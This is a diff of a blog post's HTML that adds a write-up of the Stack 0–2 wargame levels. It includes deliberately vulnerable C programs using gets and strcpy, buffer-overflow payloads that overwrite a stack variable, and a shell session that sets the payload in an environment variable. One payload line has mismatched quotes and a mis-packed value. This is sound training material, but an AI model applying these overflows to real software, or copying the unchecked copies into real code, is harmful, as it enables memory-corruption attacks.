@@ -118,7 +118,9 @@
 
 <p>Here we go,</p>
 
-<p>First (easiest, too) level is Stack 0. They&rsquo;ve given us a piece of code:</p>
+<h2>STACK 0</h2>
+
+<p>This is the first (easiest, too) level. They&rsquo;ve given us a piece of code:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -138,7 +140,9 @@
 <span class='line-number'>16</span>
 <span class='line-number'>17</span>
 <span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdlib.h&gt;
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack0.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
 </span><span class='line'>#include &lt;unistd.h&gt;
 </span><span class='line'>#include &lt;stdio.h&gt;
 </span><span class='line'>
@@ -159,6 +163,85 @@
 
 
 <p>Our goal is modify <code>modified</code>&rsquo;s value through <code>gets(buffer)</code> function. &ldquo;Sound fabulous, how can i change this variable&rsquo;s value when i cant touch it ?&rdquo;. However, when you use <a href="http://www.gnu.org/software/gdb/">gdb</a> to debug that file, you will recognize that <code>buffer</code>&rsquo;s address is just below <code>modified</code>&rsquo;s address in STACK. So, if we overload the <code>buffer</code>, the leftover will overwrite <code>modified</code> => the payload we need in this level is a string contains 70 * &lsquo;A&rsquo; (try more if you want).</p>
+
+<h2>STACK 1</h2>
+
+<p>In this challenge, we have a code which is much the same as previous one.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack1.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int modified;
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  if(argc == 1) {
+</span><span class='line'>      errx(1, "please specify an argument\n");
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  modified = 0;
+</span><span class='line'>  strcpy(buffer, argv[1]);
+</span><span class='line'>
+</span><span class='line'>  if(modified == 0x61626364) {
+</span><span class='line'>      printf("you have correctly got the variable to the right value\n");
+</span><span class='line'>  } else {
+</span><span class='line'>      printf("Try again, you got 0x%08x\n", modified);
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not only overload <code>buffer</code>, we need make <code>modified</code>&rsquo;s value same as <code>0x61626364</code> (equal to <code>'abcd'</code> in ascii).
+Cuz the execute environment belongs to little endiance system, so you must <code>pack('&lt;I', targetvalue)</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = 64 * 'A' + pack('&lt;I", '0x61626364')
+</span><span class='line'>        = 64 * 'A' + '\x64\x63\x62\x61'</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>STACK 2</h2>
+
+<p>Instead of reading buffer from keyboard, this level require <code>GREENIE</code> environment variable. We use <code>export</code> command in Linux</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  bin  GREENIE=`python2 -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`
+</span><span class='line'>➜  bin  export GREENIE
+</span><span class='line'>➜  bin  ./stack2
+</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure>
+
+
+
 </div>
       
       
